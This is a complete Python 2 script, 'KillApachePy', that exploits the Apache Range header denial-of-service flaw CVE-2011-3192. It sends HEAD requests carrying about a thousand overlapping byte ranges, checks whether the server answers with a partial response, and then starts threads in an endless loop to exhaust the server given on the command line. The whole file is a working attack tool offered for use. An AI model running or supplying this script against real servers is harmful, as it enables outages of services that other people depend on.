#!/usr/bin/env python

import optparse, os, socket, threading, time

NAME    = "KillApachePy (Range Header DoS CVE-2011-3192)"
VERSION = "0.1a"
AUTHOR  = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
LICENSE = "Public domain (FREE)"

def attack(target):
    def _send(recv=False):
        host, port = target.split(':') if ':' in target else (target, 80)
        payload = ",".join("5-%d" % item for item in xrange(1, 1024))
        packet = "HEAD / HTTP/1.1\r\nHost: %s\r\nRange:bytes=0-,%s\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n" % (target, payload)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            s.send(packet)
            if recv:
                return s.recv(100)
        finally:
            s.close()

    if 'Partial' not in _send(True):
        print "(x) Target does not seem to be vulnerable"
    else:
        try:
            while True:
                threads = []
                print "(i) Creating new threads..."
                try:
                    while True:
                        thread = threading.Thread(target=_send)
                        thread.start()
                        threads.append(thread)
                except KeyboardInterrupt:
                    raise
                except Exception, msg:
                    if 'new thread' in str(msg):
                        print "(i) Maximum number of new threads reached (%d)" % len(threads)
                    elif 'timed out' in str(msg):
                        print "(i) Server seems to be choked ('%s')" % msg
                    else:
                        print "(x) Exception occured ('%s')" % msg
                finally:
                    print "(o) Waiting for 5 seconds to acquire new threads"
                    time.sleep(5)
                    print
        except KeyboardInterrupt:
            print "\r(x) Ctrl-C was pressed"
            os._exit(1)

if __name__ == "__main__":
    print "%s #v%s\n by: %s\n" % (NAME, VERSION, AUTHOR)
    parser = optparse.OptionParser(version=VERSION, option_list=[optparse.make_option("-t", dest="target", help="Target (e.g. \"www.target.com\")")])
    options, _ = parser.parse_args()
    if options.target:
        result = attack(options.target)
    else:
        parser.print_help()
